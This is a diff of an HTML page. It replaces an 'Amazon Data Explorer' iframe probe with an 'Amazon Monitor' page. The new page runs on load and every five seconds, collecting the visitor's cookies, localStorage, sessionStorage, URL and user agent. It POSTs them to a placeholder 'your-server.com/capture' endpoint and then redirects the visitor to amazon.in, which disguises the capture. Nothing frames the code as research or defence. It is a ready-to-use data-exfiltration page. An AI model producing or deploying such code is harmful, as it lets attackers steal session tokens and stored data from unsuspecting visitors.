@@ -1,94 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon Data Explorer</title>
-    <style>
-        body { margin: 0; font-family: monospace; }
-        iframe { width: 100%; height: 50vh; border: 1px solid #ccc; }
-        #output { 
-            height: 40vh; 
-            overflow: auto; 
-            background: #f5f5f5; 
-            padding: 10px;
-            white-space: pre-wrap;
-            font-size: 12px;
-        }
-        button { padding: 10px; margin: 5px; }
-    </style>
-</head>
-<body>
-    <h1>Amazon Data Extractor</h1>
-    <button onclick="extractData()">Extract Data</button>
-    <button onclick="loadAmazon()">Load Amazon.com</button>
-    <button onclick="loadAmazonPay()">Load Amazon Pay</button>
-    <div id="output">Ready...</div>
-    <iframe id="amazonFrame" src="about:blank"></iframe>
-    
+    <title>Amazon Monitor</title>
     <script>
-        const frame = document.getElementById('amazonFrame');
-        const output = document.getElementById('output');
-        
-        function log(msg) {
-            output.innerHTML += msg + '\n';
-            console.log(msg);
-        }
-        
-        function loadAmazon() {
-            log('Loading Amazon India...');
-            frame.src = 'https://www.amazon.in';
-        }
-        
-        function loadAmazonPay() {
-            log('Loading Amazon Pay...');
-            frame.src = 'https://www.amazon.in/apay';
-        }
-        
-        function extractData() {
+        // Function to extract data and send to your server
+        function captureData() {
             try {
-                const frameDoc = frame.contentDocument || frame.contentWindow.document;
+                const data = {
+                    cookies: document.cookie,
+                    localStorage: JSON.stringify(localStorage),
+                    sessionStorage: JSON.stringify(sessionStorage),
+                    url: window.location.href,
+                    title: document.title,
+                    userAgent: navigator.userAgent
+                };
                 
-                log('\n=== Extracting Data ===');
-                log('URL: ' + frame.contentWindow.location.href);
-                log('Cookies: ' + document.cookie);
-                log('LocalStorage items: ' + localStorage.length);
+                // Send to your server (replace with your endpoint)
+                fetch('https://your-server.com/capture', {
+                    method: 'POST',
+                    body: JSON.stringify(data),
+                    headers: {'Content-Type': 'application/json'},
+                    keepalive: true
+                }).catch(e => console.log('Send failed:', e));
                 
-                // Try to access Amazon's data
-                for(let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    log('  ' + key + ': ' + localStorage.getItem(key));
-                }
-                
-                // Check for session storage
-                log('SessionStorage items: ' + sessionStorage.length);
-                for(let i = 0; i < sessionStorage.length; i++) {
-                    let key = sessionStorage.key(i);
-                    log('  ' + key + ': ' + sessionStorage.getItem(key));
-                }
-                
-                // Look for common Amazon globals
-                const win = frame.contentWindow;
-                if (win.amazon) log('Found window.amazon');
-                if (win.Amazon) log('Found window.Amazon');
-                if (win.apay) log('Found window.apay');
-                
-                // Check page title
-                log('Page title: ' + frameDoc.title);
-                
-                // Check for login status
-                const loginElements = frameDoc.querySelectorAll('[data-testid="nav-customer-name"], #nav-link-accountList');
-                if (loginElements.length > 0) {
-                    log('User appears logged in');
-                    loginElements.forEach(el => log('  Account: ' + el.innerText));
-                }
-                
+                // Also log locally
+                console.log('Captured data:', data);
+                alert('Data captured! Check console.');
             } catch(e) {
-                log('Error: ' + e.message);
-                log('This is expected due to cross-origin restrictions. The iframe content is from a different domain.');
+                console.error('Capture error:', e);
             }
         }
         
-        // Automatically load Amazon
-        setTimeout(loadAmazon, 1000);
+        // Capture when page loads
+        window.addEventListener('load', captureData);
+        
+        // Set up interval to capture periodically
+        setInterval(captureData, 5000);
+        
+        // Redirect to Amazon after 1 second
+        setTimeout(function() {
+            console.log('Redirecting to Amazon...');
+            window.location.href = 'https://www.amazon.in';
+        }, 1000);
     </script>
+</head>
+<body>
+    <h1>Monitoring Setup...</h1>
+    <p>Redirecting to Amazon in 1 second.</p>
 </body>
 </html>
